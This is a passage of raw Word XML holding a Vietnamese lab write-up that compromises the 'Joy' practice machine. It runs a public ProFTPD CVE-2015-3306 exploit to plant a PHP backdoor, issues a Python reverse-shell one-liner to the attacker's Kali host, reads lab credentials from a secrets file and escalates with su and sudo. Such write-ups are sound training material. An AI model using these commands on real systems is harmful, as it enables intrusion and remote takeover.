        </w:rPr>
        <w:t>Câu lệnh:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="21F371A5" w14:textId="46AB4C06" w:rsidR="00D84A91" w:rsidRDefault="00D84A91" w:rsidP="00D84A91">
      <w:pPr>
        <w:spacing w:after="20"/>
        <w:ind w:left="397"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="21"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D84A91">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>git clone https://github.com/t0kx/exploit-CVE-2015-3306</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>.git</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4AC5C56F" w14:textId="7594D133" w:rsidR="00D84A91" w:rsidRPr="00FA13A8" w:rsidRDefault="00FA13A8">
      <w:pPr>
        <w:spacing w:after="60"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="EE0000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00FA13A8">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="EE0000"/>
        </w:rPr>
        <w:t xml:space="preserve">      cd exploit-CVE-2015-3306</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2BCB95A8" w14:textId="77777777" w:rsidR="00FA13A8" w:rsidRDefault="00FA13A8">
      <w:pPr>
        <w:spacing w:after="60"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="21"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00FA13A8">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>python exploit.py --host 192.168.56.124 --port 21 --path /var/www/tryingharderisjoy</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="315B8874" w14:textId="1C3B58D5" w:rsidR="00134469" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="60"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>Nguồn mã khai thác:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F8E9B24" w14:textId="77777777" w:rsidR="00134469" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="20"/>
        <w:ind w:left="397"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>https://github.com/t0kx/exploit-CVE-2015-3306</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3CE2751E" w14:textId="77777777" w:rsidR="00134469" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="60"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve">Kết quả: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>Tạo được tệp backdoor.php trong thư mục web của máy mục tiêu.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4AC68F93" w14:textId="17053E01" w:rsidR="00134469" w:rsidRDefault="00FA13A8">
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="3F287B90" wp14:editId="2B503DB9">
            <wp:extent cx="6152515" cy="2704465"/>
            <wp:effectExtent l="0" t="0" r="635" b="635"/>
            <wp:docPr id="1814516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516373" name=""/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId13"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="6152515" cy="2704465"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="410E6560" w14:textId="078453FC" w:rsidR="00FA13A8" w:rsidRDefault="00FA13A8">
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="7A969494" wp14:editId="17891FB1">
            <wp:extent cx="6152515" cy="1797050"/>
            <wp:effectExtent l="0" t="0" r="635" b="0"/>
            <wp:docPr id="939612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612558" name=""/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId14"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="6152515" cy="1797050"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E7EE613" w14:textId="77777777" w:rsidR="00134469" w:rsidRDefault="00134469"/>
    <w:p w14:paraId="254D416B" w14:textId="77777777" w:rsidR="00134469" w:rsidRDefault="00134469"/>
    <w:p w14:paraId="1FD36989" w14:textId="77777777" w:rsidR="00134469" w:rsidRDefault="00134469"/>
    <w:p w14:paraId="0C846113" w14:textId="77777777" w:rsidR="00134469" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:before="160" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>Bước 6. Kiểm tra thực thi lệnh từ xa</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D8CC123" w14:textId="77777777" w:rsidR="00134469" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="60"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve">Mục đích: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>Xác nhận backdoor có thể thực thi lệnh hệ thống trên máy mục tiêu.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2BDA2E23" w14:textId="77777777" w:rsidR="00134469" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="60"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>Đường dẫn thực thi:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C28C70F" w14:textId="6F99AF87" w:rsidR="00134469" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="20"/>
        <w:ind w:left="397"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>http://192.168.56.124/backdoor.php?cmd=i</w:t>
      </w:r>
      <w:r w:rsidR="00FA13A8">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>d</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="73697C30" w14:textId="77777777" w:rsidR="00134469" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="60"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve">Kết quả: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>Trang web trả về thông tin giao diện mạng, chứng minh lệnh đã được thực thi từ xa.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71989FE9" w14:textId="6A98BD10" w:rsidR="00134469" w:rsidRDefault="00FA13A8">
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="009A067A" wp14:editId="4FBF461D">
            <wp:extent cx="6152515" cy="1797050"/>
            <wp:effectExtent l="0" t="0" r="635" b="0"/>
            <wp:docPr id="1265966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966767" name=""/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId15"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="6152515" cy="1797050"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="073BA562" w14:textId="77777777" w:rsidR="00134469" w:rsidRDefault="00134469"/>
    <w:p w14:paraId="16445E45" w14:textId="77777777" w:rsidR="00134469" w:rsidRDefault="00134469"/>
    <w:p w14:paraId="57E14359" w14:textId="77777777" w:rsidR="00134469" w:rsidRDefault="00134469"/>
    <w:p w14:paraId="77E195B4" w14:textId="77777777" w:rsidR="00134469" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:before="160" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>Bước 7. Tạo reverse shell</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="24391B92" w14:textId="77777777" w:rsidR="00134469" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="60"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve">Mục đích: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>Mở kết nối shell từ máy Joy về máy Kali để thao tác trực tiếp trên hệ thống.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3DE36936" w14:textId="77777777" w:rsidR="00134469" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="60"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>Câu lệnh lắng nghe trên Kali:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="584806CC" w14:textId="77777777" w:rsidR="00134469" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="20"/>
        <w:ind w:left="397"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="21"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>nc -nlvp 443</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7128DE78" w14:textId="29FF9D56" w:rsidR="00FA13A8" w:rsidRDefault="00FA13A8">
      <w:pPr>
        <w:spacing w:after="20"/>
        <w:ind w:left="397"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>getid</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E399334" w14:textId="77777777" w:rsidR="00134469" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="60"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>Đường dẫn tạo reverse shell:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61D11C96" w14:textId="77777777" w:rsidR="00134469" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="20"/>
        <w:ind w:left="397"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>http://192.168.56.124/backdoor.php?cmd=python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.56.122",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E429982" w14:textId="77777777" w:rsidR="00134469" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="60"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve">Kết quả: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>Máy Kali nhận được kết nối shell từ máy mục tiêu.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="65A00BDF" w14:textId="548B2C83" w:rsidR="00134469" w:rsidRDefault="00976D57">
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="7A378763" wp14:editId="6234B114">
            <wp:extent cx="6152515" cy="3651885"/>
            <wp:effectExtent l="0" t="0" r="635" b="5715"/>
            <wp:docPr id="781677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77275" name=""/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId16"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="6152515" cy="3651885"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="041CF9E9" w14:textId="735E6FEF" w:rsidR="00976D57" w:rsidRDefault="00976D57">
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="08F90BAE" wp14:editId="3F26A6A8">
            <wp:extent cx="6152515" cy="337185"/>
            <wp:effectExtent l="0" t="0" r="635" b="5715"/>
            <wp:docPr id="1286482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482041" name=""/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId17"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="6152515" cy="337185"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="11C66359" w14:textId="5E92D5EE" w:rsidR="00976D57" w:rsidRDefault="00976D57">
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="422602F9" wp14:editId="3CA0A2BE">
            <wp:extent cx="6152515" cy="1250315"/>
            <wp:effectExtent l="0" t="0" r="635" b="6985"/>
            <wp:docPr id="1117599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599954" name=""/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId18"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="6152515" cy="1250315"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="47F46964" w14:textId="77777777" w:rsidR="00134469" w:rsidRDefault="00134469"/>
    <w:p w14:paraId="067BF314" w14:textId="77777777" w:rsidR="00134469" w:rsidRDefault="00134469"/>
    <w:p w14:paraId="5C290042" w14:textId="77777777" w:rsidR="00134469" w:rsidRDefault="00134469"/>
    <w:p w14:paraId="2BFBD472" w14:textId="77777777" w:rsidR="00134469" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:before="160" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>Bước 8. Kiểm tra quyền sudo</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7711E58A" w14:textId="77777777" w:rsidR="00134469" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="60"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve">Mục đích: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>Xác định các lệnh người dùng hiện tại được phép chạy với quyền sudo.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="049FCDF5" w14:textId="77777777" w:rsidR="00134469" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="60"/>
        <w:rPr>
          <w:b/>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>Câu lệnh:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B81634B" w14:textId="763CA96D" w:rsidR="008E300D" w:rsidRDefault="008E300D">
      <w:pPr>
        <w:spacing w:after="60"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve">         </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D6A4784" w14:textId="6B8ED5DC" w:rsidR="008E300D" w:rsidRPr="008E300D" w:rsidRDefault="00000000" w:rsidP="008E300D">
      <w:pPr>
        <w:spacing w:after="20"/>
        <w:ind w:left="397"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="21"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>sudo -l</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28691B3B" w14:textId="61AF46EA" w:rsidR="008E300D" w:rsidRPr="008E300D" w:rsidRDefault="008E300D">
      <w:pPr>
        <w:spacing w:after="20"/>
        <w:ind w:left="397"/>
        <w:rPr>
          <w:color w:val="EE0000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="008E300D">
        <w:rPr>
          <w:color w:val="EE0000"/>
        </w:rPr>
        <w:t xml:space="preserve">ls </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22E4ACE8" w14:textId="77777777" w:rsidR="008E300D" w:rsidRPr="008E300D" w:rsidRDefault="008E300D">
      <w:pPr>
        <w:spacing w:after="20"/>
        <w:ind w:left="397"/>
        <w:rPr>
          <w:color w:val="EE0000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="008E300D">
        <w:rPr>
          <w:color w:val="EE0000"/>
        </w:rPr>
        <w:t xml:space="preserve">cd ossec </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1487C06B" w14:textId="77777777" w:rsidR="008E300D" w:rsidRPr="008E300D" w:rsidRDefault="008E300D">
      <w:pPr>
        <w:spacing w:after="20"/>
        <w:ind w:left="397"/>
        <w:rPr>
          <w:color w:val="EE0000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="008E300D">
        <w:rPr>
          <w:color w:val="EE0000"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">ls </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="018FC1FD" w14:textId="39C9F9FA" w:rsidR="008E300D" w:rsidRDefault="008E300D">
      <w:pPr>
        <w:spacing w:after="20"/>
        <w:ind w:left="397"/>
      </w:pPr>
      <w:r w:rsidRPr="008E300D">
        <w:rPr>
          <w:color w:val="EE0000"/>
        </w:rPr>
        <w:t>cat patricksecretsofjoy</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61610EE5" w14:textId="29BD87E4" w:rsidR="008E300D" w:rsidRPr="008E300D" w:rsidRDefault="00000000" w:rsidP="008E300D">
      <w:pPr>
        <w:spacing w:after="60"/>
        <w:rPr>
          <w:b/>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve">Kết quả: </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="267680E3" w14:textId="77777777" w:rsidR="008E300D" w:rsidRPr="008E300D" w:rsidRDefault="008E300D" w:rsidP="008E300D">
      <w:pPr>
        <w:spacing w:after="60"/>
        <w:ind w:left="1440"/>
        <w:rPr>
          <w:bCs/>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="008E300D">
        <w:rPr>
          <w:bCs/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>Tài khoản Patrick: patrick:apollo098765</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F63A4CC" w14:textId="71FD88D0" w:rsidR="008E300D" w:rsidRPr="008E300D" w:rsidRDefault="008E300D" w:rsidP="008E300D">
      <w:pPr>
        <w:spacing w:after="60"/>
        <w:ind w:left="1440"/>
        <w:rPr>
          <w:bCs/>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="008E300D">
        <w:rPr>
          <w:bCs/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>Gợi ý mật khẩu Root: root:howtheheckdoiknowwhattherootpasswordis</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7CB5ECC3" w14:textId="77777777" w:rsidR="008E300D" w:rsidRPr="008E300D" w:rsidRDefault="00000000" w:rsidP="008E300D">
      <w:pPr>
        <w:spacing w:after="60"/>
        <w:rPr>
          <w:b/>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:pict w14:anchorId="338DC8E7">
          <v:rect id="_x0000_i1025" style="width:0;height:1.5pt" o:hralign="center" o:hrstd="t" o:hr="t" fillcolor="#a0a0a0" stroked="f"/>
        </w:pict>
      </w:r>
    </w:p>
    <w:p w14:paraId="56AB833B" w14:textId="77777777" w:rsidR="008E300D" w:rsidRDefault="008E300D">
      <w:pPr>
        <w:spacing w:after="60"/>
        <w:rPr>
          <w:b/>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1D3B8CFF" w14:textId="584E25E4" w:rsidR="00134469" w:rsidRDefault="008E300D">
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="49107DE9" wp14:editId="1223AD59">
            <wp:extent cx="6152515" cy="4763135"/>
            <wp:effectExtent l="0" t="0" r="635" b="0"/>
            <wp:docPr id="1785605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05096" name=""/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId19"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="6152515" cy="4763135"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="797F07B0" w14:textId="0F1743F4" w:rsidR="008E300D" w:rsidRDefault="008E300D">
      <w:pPr>
        <w:rPr>
          <w:color w:val="EE0000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="008E300D">
        <w:rPr>
          <w:color w:val="EE0000"/>
        </w:rPr>
        <w:t>python -c 'import pty; pty.spawn("/bin/sh")'</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F8AC108" w14:textId="5BD53657" w:rsidR="008E300D" w:rsidRDefault="008E300D">
      <w:pPr>
        <w:rPr>
          <w:color w:val="EE0000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="008E300D">
        <w:rPr>
          <w:color w:val="EE0000"/>
        </w:rPr>
        <w:t>su patrick</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B7C418F" w14:textId="2EB2B440" w:rsidR="008E300D" w:rsidRDefault="008E300D">
      <w:pPr>
        <w:rPr>
          <w:color w:val="EE0000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="008E300D">
        <w:rPr>
          <w:color w:val="EE0000"/>
        </w:rPr>
        <w:t>Password: apollo098765</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5BAA9698" w14:textId="77777777" w:rsidR="008E300D" w:rsidRDefault="008E300D" w:rsidP="008E300D">
      <w:pPr>
        <w:spacing w:after="20"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>sudo /home/patrick/script/test</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="26BDD53F" w14:textId="77777777" w:rsidR="008E300D" w:rsidRPr="008E300D" w:rsidRDefault="008E300D">
      <w:pPr>
        <w:rPr>
          <w:color w:val="EE0000"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="504ACE3D" w14:textId="7CA563EC" w:rsidR="008E300D" w:rsidRDefault="008E300D">
      <w:r>
        <w:t>mục đích:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="53DFBF59" w14:textId="4AE249FF" w:rsidR="008E300D" w:rsidRDefault="008E300D" w:rsidP="008E300D">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="008E300D">
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>nâng cấp từ một Shell thô (Dumb Shell) lên một Shell đầy đủ tính năng (Interactive TTY Shell).</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>rồi sau đó đăng nhập vào tk patrick với mk vừa tìm được.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="665B88D5" w14:textId="3FE967EF" w:rsidR="0091031E" w:rsidRDefault="0091031E" w:rsidP="008E300D">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="78451D27" wp14:editId="3899B574">
            <wp:extent cx="6152515" cy="2829560"/>
            <wp:effectExtent l="0" t="0" r="635" b="8890"/>
            <wp:docPr id="1892985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985821" name=""/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId20"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="6152515" cy="2829560"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
